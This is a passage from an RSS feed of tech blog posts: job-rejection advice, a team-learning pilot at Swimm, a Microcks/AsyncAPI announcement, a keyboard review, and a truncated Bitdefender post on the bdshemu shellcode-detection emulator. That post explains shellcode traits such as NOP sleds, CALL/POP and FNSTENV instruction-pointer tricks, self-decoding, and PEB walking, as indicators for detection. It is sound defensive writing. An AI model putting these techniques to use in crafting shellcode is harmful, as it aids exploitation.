professional and tell them that this will help you understand what you had done well and what you could do to improve next time. As long as you were honest in your ask, most companies will get back to you with some form of feedback. You will be using this feedback to adjust your game plan and strategy as needed, which is part of step 3.</p><p id="8408">What you should avoid doing though is to argue or counter their feedback. The decision is already made. Don’t waste your time. However, in rare occasions, if incorrect assumption was made regarding your take home exercise, or live presentation interview, you can provide more information to address the feedback. But do not expect to be considered for the role again — in other words, do not keep your hopes up.</p></div></div></section><section><div><div><h2 id="48f7">2. Give yourself time to digest and process your emotion</h2><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/9216/0*yV4AO854GZ9Pm1u9" width="4608" height="3456" srcset="https://miro.medium.com/max/552/0*yV4AO854GZ9Pm1u9 276w, https://miro.medium.com/max/1104/0*yV4AO854GZ9Pm1u9 552w, https://miro.medium.com/max/1280/0*yV4AO854GZ9Pm1u9 640w, https://miro.medium.com/max/1400/0*yV4AO854GZ9Pm1u9 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*yV4AO854GZ9Pm1u9?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@blitzer?utm_source=medium&amp;utm_medium=referral" rel="noopener">Niklas Rhöse</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="925f">Being rejected and being unsuccessful at an interview is disappointing. There is no other way to put it. Even if you have got another offer from a different company or a different role, you would still want to get an offer for all the roles that you applied for. That’s human nature.</p><p id="b688">It’s completely ok to feel disappointed, upset, angry, defeated, or any other negative emotion for a while. Take the time to process your emotion. Personally for me, I go through a cycle of disappointment, sadness, anger, and then finally, acceptance. It usually takes me two hours, but every person is different, so it might just be 20 minutes for you, or 20 hours for another person. The key here is to allow yourself to feel that negative emotion instead of trying to push it aside. Once you’ve felt all the emotions, you will find that you’re ready to move on and think clearly again.</p><p id="baf9">Maybe the interviewer made an error in judgement, maybe you said something that were taken on the face value, maybe your interview performance was not good enough, maybe there are more suitable candidates, it doesn’t matter what the reason is. What matter is for you to be able to move on without getting paralysed by what could have been.</p></div></div></section><section><div><div><h2 id="955e">3. Adjust your game plan and strategy if needed</h2><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/12000/0*AvjW-1p4Xhn6LC15" width="6000" height="4000" srcset="https://miro.medium.com/max/552/0*AvjW-1p4Xhn6LC15 276w, https://miro.medium.com/max/1104/0*AvjW-1p4Xhn6LC15 552w, https://miro.medium.com/max/1280/0*AvjW-1p4Xhn6LC15 640w, https://miro.medium.com/max/1400/0*AvjW-1p4Xhn6LC15 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*AvjW-1p4Xhn6LC15?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@felix_mittermeier?utm_source=medium&amp;utm_medium=referral" rel="noopener">Felix Mittermeier</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="06dc">Based on the feedback that you receive, you can do one of three things. First, you may want to change how you present yourself and how you communicate your skills to be more aligned with what interviewers are looking for. Second, you may decide to gain additional knowledge and skills in the areas that were identified as gaps. Third, you may accept that you are not going to change your tactics but apply for different roles that are more aligned with your skills and experiences.</p><p id="fed4">To give you my personal example, one of the feedback that I receive from those who do not know me or have worked with me in the industry is that I do not have a leadership presence. The perception comes from the fact that technology is a male-dominated industry and people are used to seeing assertive leaders who value hierarchy and command and control. To add to the fact that I am female, petite and soft-spoken, it’s hard for some to accept that I am an effective leader. While it’s sad to see gender and leader stereotypes in the 21st century, I have come to accept the fact. I am not willing to put on an act during an interview and display the masculine attributes commonly associated with effective leadership, such as assertiveness and competition, just to get the job.</p><p id="0ad5">This doesn’t mean I do not apply for leadership roles nor get leadership positions. I just have to understand myself well and know how to present myself in the best possible light without losing my integrity. And if I am unsuccessful because it was still not good enough in the interviewer’s opinion, then so be it.</p></div></div></section><section><div><div><h2 id="ed95">4. Remember the golden rule</h2><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7744/0*bzx94k8FR8OiGrQr" width="3872" height="2592" srcset="https://miro.medium.com/max/552/0*bzx94k8FR8OiGrQr 276w, https://miro.medium.com/max/1104/0*bzx94k8FR8OiGrQr 552w, https://miro.medium.com/max/1280/0*bzx94k8FR8OiGrQr 640w, https://miro.medium.com/max/1400/0*bzx94k8FR8OiGrQr 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bzx94k8FR8OiGrQr?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@quentinreyphoto?utm_source=medium&amp;utm_medium=referral" rel="noopener">Quentin Rey</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="f2ae">What’s the golden rule, I hear you ask. Dalai Lama once said, “Remember that sometimes not getting what you want is a wonderful stroke of luck.” Whether the reason for rejection was because you didn’t yet have the technical skills required for the role, personal traits that were deemed necessary by the interviewers and/or company, or purely a misjudgement from the interviewer’s part (yes, interviewers are humans too and they may make wrong decision), know that your worth is not tied to the performance of an interview.</p><p id="ecf7">I truly believe that everything in this world happens for you, not to you. Every time after I was rejected for a role, I got a better offer from another company. So my advice for you is to spend your time and energy on becoming a better person every day instead of dwelling on the rejection, and trust that a superior offer is just around the corner.</p></div></div></section><section><div><div><h2 id="a25c">Take the next step forward</h2><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/10368/0*QY53jEzOGv_1Qgl5" width="5184" height="3888" srcset="https://miro.medium.com/max/552/0*QY53jEzOGv_1Qgl5 276w, https://miro.medium.com/max/1104/0*QY53jEzOGv_1Qgl5 552w, https://miro.medium.com/max/1280/0*QY53jEzOGv_1Qgl5 640w, https://miro.medium.com/max/1400/0*QY53jEzOGv_1Qgl5 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*QY53jEzOGv_1Qgl5?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@brett_jordan?utm_source=medium&amp;utm_medium=referral" rel="noopener">Brett Jordan</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="e65d">So what you were rejected for a role. Your life isn’t over, your career isn’t over. It’s ok. The important thing is for you to pick yourself up again and take the next step forward. You win some, you lose some, but those who are the ultimate winners are those who have the courage to keep going until they get what they deserve, in this case, a role that is aligned with what you’re looking for and a company and colleagues who will appreciate you for what you bring to the table.</p><p id="c752">Good luck!</p></div></div></section></div></div>]]>
            </description>
            <link>https://code.likeagirl.io/four-steps-to-take-after-your-unsuccessful-job-interview-d4e5df344b1a?source=your_stories_page-------------------------------------</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057115</guid>
            <pubDate>Wed, 11 Nov 2020 10:12:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forming Professional Dev Team Habits]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057078">thread link</a>) | @morchen
<br/>
November 11, 2020 | https://swimm.io/blog/2020-07-09-professionalism-by-forming-a-team-habit/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/2020-07-09-professionalism-by-forming-a-team-habit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-v-f94c7cca=""> <!----> <div data-v-0cf44990="" data-v-f94c7cca=""><div><p>How does your workplace cultivate an environment of team development? How do you make sure your engineers have time for creative ideas and professional development, all the while meeting sprints, deadlines and deliverables? While branded photogenic team building activities are common in many tech companies — especially with rapidly growing teams, this strategy fails to help grow together as professionals and misses the aim in the long run.</p>
<p>For long, I’ve been toying with such questions, asking myself — how can companies keep “the fun bits”, but also cultivate purpose and a culture of self and team professional development. In this post you’ll find the pilot we’re launching at Swimm: the main goals of such a pilot and why we believe in it, as well as the execution strategy. We will follow-up and share our experiences in future posts.</p>
<h3><strong>The Why: Delivering Code Excellence</strong></h3>
<p><strong>Professionalism</strong>. First, we want to create a culture where all of our team members learn new things, on an ongoing basis. To become professionals, we need to keep learning all the time. To stay happy and challenged at work we need access to resources, and need our managers to invest in our development.</p>
<p><strong>Innovation</strong>. Second, reviewing together new topics and brainstorming on how they can be integrated into our products will provide new ideas and make us constantly rethink our current approaches.</p>
<p>While thinking about a way to achieve these goals, I was looking for best practice, study cases and models that worked well or gloriously failed in other places in the tech industry. Specifically, I was inspired by <a href="https://medium.com/@Idan.Bassuk/a-proven-methodology-for-becoming-an-a-i-expert-32d43887cb1e">this post</a> by Idan Bassuk from <strong>Aidoc</strong>. I contacted Idan and he was very kind to answer all my questions. I learned that they’ve been continuing their “Deep Snips” (where one of their team members learns a subject and presents it to the team) for the past 3 years, and that he still believes this method helps achieve its goals. I learned from their experience that many of their talks resulted in actual impact to their products. This gave me confidence that this method can indeed have a meaningful impact, and I was now more eager than before to put this to the test.</p>
<h3><strong>The How: Swimminars X 2 Weeks</strong></h3>
<p><strong>Swimminars.</strong> Every other week, one of our engineers will get to learn something new that they wish to dive deeper into and learn. It can be about anything at all, as long as it’s technological, and can be applied to our product(s), even if not in the foreseeable future. Then, the engineer will give a lecture, sharing their research and new knowledge with the team. After every session, we will also publish a blog post, summarising the lecture for our community or new hires to use if they wish.</p>
<p><strong>Technicalities</strong>. We plan to divide the session into two parts — the first will be technical, an in-depth overview of the relevant subject (will be covered on our blog posts). The second part will include holding internal discussions on the possible utilisation, adoption and impacts of the topic on our product(s). Are we already relying on some of this knowledge? Can it help us tackle a current or future issue? Perhaps we need to consider implementing it now?</p>
<p>During the two weeks of the engineer’s turn, (s)he gets as much time as needed to learn the subject and prepare the lecture. This will be prioritised over other tasks, and we assume it will take between one and two days. This is a huge commitment — with all the tasks that we have as a startup, every day is precious. Still, we decided that the impact we are hoping for is so valuable that it’s worth the price, and that we are willing to make the experiment.</p>
<h3><strong>Piloting: Managing Expectations</strong></h3>
<p><strong>Risks</strong>. Yet, as always, it’s easier said than done. Indeed this can go wrong in different ways — time management vs efficiency, getting to a high level of interesting presentations and useful technological insight, or getting every one’s voice heard on the team in a manner that compliments them. It’s a learning on the go activity. So we’re up for a team challenge.</p>
<p><strong>Upsides</strong>. For the duration of our team pilot, every other week, the entire dev team will get to learn something new while taking turns deepening knowledge, improving writing and presentation skills and becoming experts within the team on their Swimminar topics. This team exercise will provide each engineer individually and the team as whole, positive experiences of success. We hope.</p>
<p>I will be the first to give a Swimminar — specifically, on <strong>git internals</strong>. How it goes from there, only time will tell. We promise to report back on how this experiment is working for us. Stay tuned.</p>
<p><em>Swimm is a tool helping engineers contribute to any codebase faster and better with automatically generated hints and codebase insight.</em></p>
<p><em>Omer Rosenbaum, Swimm’s Chief Technology Officer. Cyber training expert and Founder of Checkpoint Security Academy. Author of <a href="https://data.cyber.org.il/networks/networks.pdf">Computer Networks (in Hebrew)</a>. Visit My <a href="https://www.youtube.com/watch?v=79jlgESHzKQ&amp;list=PL9lx0DXCC4BMS7dB7vsrKI5wzFyVIk2Kg">YouTube Channel</a>.</em></p>
</div></div> </section></div>]]>
            </description>
            <link>https://swimm.io/blog/2020-07-09-professionalism-by-forming-a-team-habit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057078</guid>
            <pubDate>Wed, 11 Nov 2020 10:04:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bdshemu: Bitdefender shellcode emulator]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25057062">thread link</a>) | @mdontu
<br/>
November 11, 2020 | https://hvmi.github.io/blog/2020/11/11/bdshemu.html | <a href="https://web.archive.org/web/*/https://hvmi.github.io/blog/2020/11/11/bdshemu.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="introduction">Introduction</h2>

<p>Detecting exploits is one of the major strengths of Hypervisor Memory Introspection (HVMI). The ability to monitor guest physical memory pages against different kinds of accesses, such as write or execute, allows HVMI to impose restrictions on critical memory regions: for example, stack or heap pages can be marked as being non-executable at the EPT level, so when an exploit manages to gain arbitrary code execution, the introspection logic would step in and block the execution of the shellcode.</p>

<p>In theory, intercepting execution attempts from memory regions such as the stack or the heap should be enough to prevent most of the exploits. Real life is often more complicated, and there are many cases where legit software uses techniques that may resemble on attack - Just In Time compilation (JIT) in browsers is one good example. In addition, an attacker may store its payload in other memory regions, outside the stack or the heap, so a method of discerning good code from bad code is useful.</p>

<p>We will talk in this blog post about the Bitdefender Shellcode Emulator, or <a href="https://github.com/bitdefender/bddisasm">bdshemu</a> for short. bdshemu is a library capable of emulating basic x86  instructions (in all modes - 16, 32 and 64 bit), while observing shellcode-like behavior. Legitimate code, such as JIT code, will look different compared to a traditional shellcode, so this is what bdshemu is trying to determine: whether the emulated code behaves like a shellcode or not.</p>

<h2 id="bdshemu-overview">bdshemu Overview</h2>

<p>bdshemu is a library written in C, and is part of the bddisasm project (and of course, it makes use of bddisasm for instruction decoding). The bdshemu library is built to emulate x86 code only, so it has no support for API calls. In fact, the emulation environment is highly restricted and stripped down, and there are only two memory regions available:</p>

<ul>
  <li>The page(s) containing the emulated code;</li>
  <li>The stack;</li>
</ul>

<p>Both of these memory regions are virtualized, meaning that they are in fact copies of the actual memory being emulated, so modifications made to them don’t affect the actual system state. Any access made by the emulated code outside of these two areas (which we will call the shellcode and the stack, respectively) will trigger immediate emulation termination. For example, an API call will automatically cause a branch outside the shellcode region, thus terminating emulation. However, in bdshemu, all we care about is instruction-level behavior of the code, which is enough to tell us whether the code is malicious or not.</p>

<p>While bdshemu provides the main infrastructure for detecting shellcodes inside a guest operating-system, it is worth noting that this is not the only way HVMI determines that execution of a certain page is malicious - two other important indicators are used:</p>

<ul>
  <li>The executed page is located on the stack - this is common with stack-based vulnerabilities;</li>
  <li>The stack is pivoted - when a page is first executed and the <code>RSP</code> register points outside the normal stack allocated for the thread;</li>
</ul>

<p>These two indicators are enough on their own to trigger an exploit detection. If these are not triggered, bdshemu is used to take a good look at the executed code, and decide if it should be blocked or not.</p>

<h2 id="bdshemu-architecture">bdshemu Architecture</h2>

<p>bdshemu is created as a standalone C library, and it only depends on bddisasm. Working with bdshemu is fairly simple, as just like bddisasm, it is a single-API library:</p>
<div><div><pre><code><span>SHEMU_STATUS</span>
<span>ShemuEmulate</span><span>(</span>
    <span>SHEMU_CONTEXT</span> <span>*</span><span>Context</span>
    <span>);</span>
</code></pre></div></div>

<p>The emulator expects a single <code>SHEMU_CONTEXT</code> argument, containing all the needed information in order to emulate the suspicious code. This context is split in two sections - input parameters and output parameters. The input parameters must be supplied by the caller, and they contain information such as the code to be emulated, or initial register values. The output parameters contain information such as what shellcode indicators bdshemu detected. All these fields are well documented in the source-code.</p>

<p>Initially, the context is filled in with the following main information (please note that emulation outcome may change depending on the value of the provided registers and stack):</p>

<ul>
  <li>Input registers, such as segments, general purpose registers, MMX and SSE registers; they can be left 0, if they are not known, or if they are irrelevant;</li>
  <li>Input code, which is the actual code to be emulated;</li>
  <li>Input stack, which can contain actual stack contents, or can be left 0;</li>
  <li>Environment info, such as mode (32 or 64 bit), or ring (0, 1, 2 or 3);</li>
  <li>Control parameters, such as minimum stack-string length, minimum NOP sled length or the maximum number of instructions that should be emulated;</li>
</ul>

<p>The main output parameter is the <code>Flags</code> field, which contains a list of shellcode indicators detected during the emulation. Generally, a non-zero value of this field strongly suggests that the emulate code is, in fact, a shellcode.</p>

<p>bdshemu is built as a plain, quick and simple x86 instruction emulator: since it only works with the shellcode itself and a small virtual stack, it doesn’t have to emulate any architectural specifics - interrupts or exceptions, descriptor tables, page-tables, etc. In addition, since we only deal with the shellcode and stack memory, bdshemu does not do memory access checks, since it doesn’t even allow accesses to other addresses. The only state apart from the registers that can be accessed is the shellcode itself and the stack, and both are copies of the actual memory contents - the system state is never modified during the emulation, only the provided <code>SHEMU_CONTEXT</code> is. This makes bdshemu extremely fast, simple, and lets us focus on its main purpose: detecting shellcodes.</p>

<p>As far as instruction support goes, bdshemu supports all the basic x86 instructions, such as branches, arithmetic, logic, shift, bit manipulation, multiplication/divison, stack access and data transfer instructions. In addition, it also has support for other instructions, such as some basic MMX or AVX instructions - <code>PUNPCKLBW</code> or <code>VPBROADCAST</code> are two good examples.</p>

<h2 id="bdshemu-detection-techniques">bdshemu Detection Techniques</h2>

<p>In order to determine whether an emulated piece of code behaves like a shellcode, there are several indicators bdshemu uses.</p>

<h3 id="nop-sled">NOP Sled</h3>

<p>This is the classic presentation of shellcodes; since the exact entry point of the shellcode when gaining code execution may be unknown, attackers usually prepend a long sequence of <code>NOP</code> instructions, encoding <code>0x90</code>. The parameters for the NOP-sled length can be controlled when calling the emulator, via the <code>NopThreshold</code> context field. The default value is <code>SHEMU_DEFAULT_NOP_THRESHOLD</code>, which is <code>75</code>, meaning that minimum 75% of all the emulated instruction must be <code>NOP</code>.</p>

<h3 id="rip-load">RIP Load</h3>

<p>Shellcodes are designed to work correctly no matter what address they’re loaded at. This means that the shellcode has to determine, dynamically, during runtime, the address it was loaded at, so absolute addressing can be replaced with some form of relative addressing. This is typically achieved by retrieving the value of the instruction pointer using well-known techniques:</p>

<ul>
  <li><code>CALL $+5/POP ebp</code> - executing these two instructions will result in the value of the instruction pointer being stored in the <code>ebp</code> register; data can then be accessed inside the shellcode using offsets relative to the <code>ebp</code> value;</li>
  <li><code>FNOP/FNSTENV [esp-0xc]/POP edi</code> - the first instruction is any FPU instruction (not necessarily <code>FNOP</code>), and the second instruction, <code>FNSTENV</code> saves the FPU environment on the stack; the third instruction will retrieve the <code>FPU Instruction Pointer</code> from <code>esp-0xc</code>, which is part of the FPU environment, and contains the address of the last FPU executed - in our case, <code>FNOP</code>; from there on, addressing relative to the <code>edi</code> can be used to access shellcode data;</li>
</ul>

<p>Internally, bdshemu keeps track of all the instances of the instruction pointer being saved on the stack. Later loading that instruction pointer from the stack in any way will result in triggering this detection. Due to the way bdshemu keeps track of the saved instruction pointers, it doesn’t matter when, where or how the shellcode attempts to load the RIP in a register and use it, bdshemu will always trigger a detection.</p>

<p>In 64 bit, RIP-relative addressing can be used directly, since the instruction encoding allows it. However, surprisingly, a large number of shellcodes still use a classic method of retrieving the instruction pointer (generally the <code>CALL/POP</code> technique), which is somehow weird, but it probably indicated that 32 bit shellcodes were ported to 64 bit with minimal modifications.</p>

<h3 id="write-self">Write Self</h3>

<p>Most often, shellcodes come in encoded or encrypted forms, in order to avoid certain bad characters (for example, <code>0x00</code> in a shellcode that should resemble a string may break the exploit) or to avoid detection by security technologies (for example, AV scanners). This means that during runtime, the shellcode must decode itself (usually in-place), by modifying its own contents, and then executing the plain-text code. Typical methods of decoding involve <code>XOR</code> or <code>ADD</code> based decryption algorithms.</p>

<p>Certainly, bdshemu follows this kind of behavior, and keeps track internally of each modified byte inside the shellcode. Whenever the suspected shellcode writes any portion of itself, and then it executes it, the self-write detection will be triggered.</p>

<h3 id="tib-access">TIB Access</h3>

<p>Once a shellcode has gained code execution, it needs to locate several functions inside various modules, in order to carry its actual payload (for example, downloading a file, or creating a process). On Windows, the most common way of doing this is by parsing the user-mode loader structures, in order to locate the addresses where the required modules were loaded, and then locate the needed functions inside these modules. The sequence of structures the shellcode will access is:</p>

<ol>
  <li>The Thread Environment Block (<code>TEB</code>), which is located at <code>fs:[0]</code> (32 bit thread) or <code>gs:[0]</code> (64 bit thread);</li>
  <li>The Process Environment Block (<code>PEB</code>), which is located at <code>TEB+0x30</code> (32 bit) or <code>TEB+0x60</code> (64 bit)</li></ol></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hvmi.github.io/blog/2020/11/11/bdshemu.html">https://hvmi.github.io/blog/2020/11/11/bdshemu.html</a></em></p>]]>
            </description>
            <link>https://hvmi.github.io/blog/2020/11/11/bdshemu.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057062</guid>
            <pubDate>Wed, 11 Nov 2020 10:01:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Test your event-driven architecture with Microcks and AsyncAPI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057022">thread link</a>) | @derberg
<br/>
November 11, 2020 | https://www.asyncapi.com/blog/microcks-asyncapi-part1 | <a href="https://web.archive.org/web/*/https://www.asyncapi.com/blog/microcks-asyncapi-part1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/microcks-1.0.0-loves-asyncapi.webp" alt="Post cover image"><p>August 11th 2020 was the official announcement of <a href="https://microcks.io/blog/microcks-1.0.0-release/">Microcks 1.0.0</a> release and our first Microcks General Availability (GA) version to fully manage event-driven API through the support of <a href="https://www.asyncapi.com/">AsyncAPI</a> specification. <strong>This first post explains why we decided to start this project and provides more insights.</strong></p><p>For those who don't know <a href="https://microcks.io/">Microcks</a> yet: it is the ultimate Open source Kubernetes Native tool for Mocking and Testing all your APIs. With Microcks, you can turn your API contract, collection or SOAP UI projects into live mocks in a few seconds. For further information, please read <a href="https://microcks.io/blog/why-microcks/">"Why Microcks ?"</a>.</p><p>We are following the <a href="https://www.asyncapi.com/">AsyncAPI</a> specification initiative since day one and I clearly remember how the <a href="https://blog.hitchhq.com/introducing-the-asyncapi-specification-7feb57b460ae">first announcement back in 2017</a> resonated within our team ! We shared the same principles: Open source and community driven... and last but not least, 100% aligned with our vision that open specifications standards like <a href="https://www.openapis.org/">OpenAPI</a> is the ultimate way to move forward and perpetuate our mantra: unlock developers potential in an unpredictable and strongly innovative environment!</p><p>Since then, we have been in touch with our mutual communities and strategic users to see if we all embrace the idea of adding AsyncAPI testing and mocking support within Microcks.
Microcks community was very enthusiastic by the idea and problem this integration can solve. We have helped some users on their AsyncAPI use cases to grab valuable feedback on how to manage Microcks event-driven API integration. We learned a lot from different vertical industries, including tricky IoT &amp; Edge computing or fintech implementations.</p><p>Our communities clearly validate that it makes sense to have the same tool managing all their API whatever the type, open contract definition or design tool used. This is why, today Microcks supports open standards for contract definitions and mainstream open collaborative tools:</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/microcks-supported-standards.webp" alt="microcks-supported-standards"></p><p>It took us a year to make, which explains why Microcks 1.0.0 release is already GA and the first tool on <a href="https://www.asyncapi.com/docs/tooling/#mocking">this topic</a><undefined> <span role="img" aria-label="winking face">😉</span> </undefined></p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/asyncapi-tool-tweet.webp" alt="asyncapi-tool-tweet"></p><p>This is a major step forward as we are convinced that the transition to cloud-native applications will strongly embrace event-based and reactive architecture. Thus the need to speed-up and govern event-based API like any other services mocking using Microcks will be crucial and a key success factor for any modern and agile software developments.</p><p>Microcks 1.0.0 provides a solid platform for simulating event-based API using message broker technologies like <a href="https://kafka.apache.org/">Apache Kafka</a> even before the publishing component has been developed. And once developed, it is then capable to validate that all the publisher sent events will be compliant with the defined specification, automatically from a CI/CD pipeline.</p><p>To demonstrate our commitment/vision and to <a href="https://www.asyncapi.com/blog/status-update-37-20/#proposal-for-more-formal-examples">improve AsyncAPI specifications</a> on our favorite topic: testing &amp; mocking, we have launched an upstream feature request in order to provide a formal type for message examples.</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part1/call-to-action.webp" alt="call-to-action"></p><p>Please have a look at <a href="https://github.com/asyncapi/asyncapi/issues/329">this proposal #329</a> and share your opinion. At the moment, it is a part of <a href="https://github.com/asyncapi/asyncapi/milestone/17">AsyncAPI 2.1 milestone</a>.</p><p> <strong> In the next article, we will focus on Microcks + AsyncAPI use cases. Stay tuned.</strong></p><blockquote><p>And if you can't wait for text explanataions, do not hesitate having a look at the <a href="https://www.youtube.com/watch?v=pmRA4M-TWuE">AsyncAPI SIG Meeting #34 recording</a><undefined> for full illustrations of the capabilities. <span role="img" aria-label="winking face">😉</span></undefined></p></blockquote></article></div>]]>
            </description>
            <link>https://www.asyncapi.com/blog/microcks-asyncapi-part1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057022</guid>
            <pubDate>Wed, 11 Nov 2020 09:53:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Keyboardio Atreus: Yeah or Meh?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056988">thread link</a>) | @liveweird
<br/>
November 11, 2020 | https://no-kill-switch.ghost.io/keyboardio-atreus-yeah-or-meh-review/ | <a href="https://web.archive.org/web/*/https://no-kill-switch.ghost.io/keyboardio-atreus-yeah-or-meh-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-post-id="5faba45f5480d10039a1a829">
	

	<section>
		<p>I've bought another mechanical keyboard (technically - I've backed <a href="https://www.kickstarter.com/projects/keyboardio/atreus">the Kickstarter campaign</a>). Feel free to call me an addict - I don't mind. It's my 4th and all three that I already have work well until now, so I have no valid reason to complain about them. Why waste money then (as they were not cheap - we're talking about an expenditure of 130+ USD per keyboard)?</p><p>The truth is, I use more than one computer (on a daily basis). Desktop PC powered by Windows 10, my private development machine (macOS), and the one provided by the company I currently cooperate with (Ubuntu 20). That means constant switching between very different keyboards and layouts. MacBook Pro's keyboard is pure rubbish (even the refined scissor 2020 model), Lenovo Thinkpad's one is a bit better but still very far from typing experience achievable only for mechanical keyboards, my desktop keyboard is fine but freakin' huge.</p><p>That's why I've decided that what I really need is a reliable mechanical keyboard <strong>I could carry with me easily</strong> and plug anywhere I want.</p><p>Sounds easy, but there are objective obstacles. Mechanical keyboards are generally large and heavy. Both Das Keyboards I own are 100% out of the question here. I have an 88 WASD keyboard as well, but even w/o a numerical keypad, it's too big to carry in the backpack.</p><p>Atreus to the rescue.</p><p>The brand "Atreus" is not new. If you're into mechanical keyboards, you've probably heard about <a href="https://atreus.technomancy.us/">Classic Atreus</a> - as it's available since 2014. The concept was very simple - to create a mechanical keyboard that is fully optimized for natural palms position, so you have all the keys within reach w/o making any move. That also means minimizing the number of keycaps by doing some crazy optimizations (more about that later).</p><p>The keyboard I've ordered is a product of cooperation of <strong>Atreus</strong> and <strong>Keyboardio</strong> - a refreshed, minimalistic version of Classic Atreus with few slight improvements aimed to make it even more compact and apply the lessons from previous models (e.g., adjust the keys in the very center area). You can read more about it (incl. specs and design decisions) <a href="https://shop.keyboard.io/products/keyboardio-atreus">here</a>.</p><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/11/atreus_top.jpg" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/11/atreus_top.jpg 600w, https://no-kill-switch.ghost.io/content/images/2020/11/atreus_top.jpg 900w" sizes="(min-width: 720px) 720px"></figure><p>I've ordered a blank model (no symbols on the top of keycaps) with <strong>Kailh BOX White switches</strong> and the dedicated case. It's the first model with Kailh switches I've ever tried. The white ones are clicky and have very early tactile feedback. I'm not going to delay that message - the switches turned out to be <u>AWESOME</u>. The typing experience is extremely satisfying (IMHO better than Cherry MX Clear or Gamma Zulu ones). It does require some (reasonable) force, but in exchange, you get the subliminal certainty (the one that doesn't involve conscious thinking) of whether you pressed the button effectively (once) or not.</p><p>OK, good switches are important, but what about the layout? If you've used previous models of Atreus before, you won't be surprised - the changes are subtle but not revolutionary. If you had no prior experience with Atreus, it may be a real shocker.</p><p>First of all, the keyboard has only <strong>44 keycaps</strong> (yay). The space bar is of the size of any other keycap. There are three modes - black, blue, and red (officially named: default, fun, and upper). Default is ... well, default. Fun is active when you <u>hold</u> the 'Fun' button (3rd from the left in the bottom row of the right part of the keyboard) and upper is <u>switched on</u> by (pressing, you don't need to hold them) <strong>Fun</strong> &amp; <strong>Esc</strong> combo.</p><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/11/atreus.png" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/11/atreus.png 600w, https://no-kill-switch.ghost.io/content/images/2020/11/atreus.png 680w"></figure><p>Some "standard" keys are entirely missing (e.g., <strong>Caps Lock</strong>), some have very un-intuitive positions (<strong>Escape</strong>, <strong>Tab</strong>, <strong>Backspace</strong>). You can read about the layout on the official page (linked above), so I'm not going to describe all the nuances - I'd like to focus on the impressions instead: how does it work? Is it easy to get used to? Convenient? How does it work for typical development keystrokes/routines?</p><p>It ... depends.</p><p>It didn't take me much time to get used to typing texts (articles, blog posts, e-mails) - the layout is a bit skewed, but still: it's QWERTY. The most mistakes I was making were in the 3rd row (<strong>'b'</strong>, <strong>'c'</strong> and <strong>'m'</strong>). However, getting accustomed to control/function keys is an entirely different kind of story:</p><ul><li><strong>Backspace</strong>/<strong>Space</strong> tandem is very different to what you know but once you try it, it gets very intuitive</li><li><strong>Ctrl</strong> and <strong>Alt</strong> are well within reach, but they force you to change your mechanical habits - that will take time</li><li><strong>Tab</strong>'s positioning is the most surprising - it's probably the least reachable keycap on the board</li><li>Having <strong>Delete</strong> in the red (upper) mode means that you're pretty much restricted to using <strong>Backspace</strong></li><li>All kinds of parenthesis (in the blue mode) require memorization from scratch</li><li>TBH I don't use red mode at all - it's just too much of a hassle (that means no <strong>PageUp</strong>, <strong>PageDown</strong>, <strong>F1 </strong>... <strong>F12 </strong>keys - but TBH I've used them very rarely anyway)</li></ul><hr><p><em>A side-note: I don't use Vim, I've also recently gave up on Spacemacs. Last months for codecrafting I've used mainly SublimeText + TabNine (80%) and Visual Studio Code (20%).</em></p><p>After two weeks of using Atreus, it feels like I'm still <u>terribly slow</u> - 